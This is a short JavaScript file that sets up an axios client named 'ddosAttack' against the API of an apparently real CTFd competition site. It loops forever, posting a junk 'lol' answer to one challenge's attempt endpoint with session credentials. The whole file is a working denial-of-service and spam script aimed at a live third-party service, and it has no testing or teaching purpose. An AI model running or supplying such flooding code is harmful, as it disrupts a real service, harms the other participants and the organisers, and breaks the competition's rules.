import axios from "axios";


const ddosAttack = axios.create({
    baseURL: 'https://2025-gmis-novice.ctfd.io/api/v1',
    timeout: 15000,
    withCredentials: true,
});
const ok = async () => {
    while (true) {
        await ddosAttack.post('/challenges/attempt', {
            question_id: 476,
            submission: "lol"
        })
    }
}

ok().then(console.log)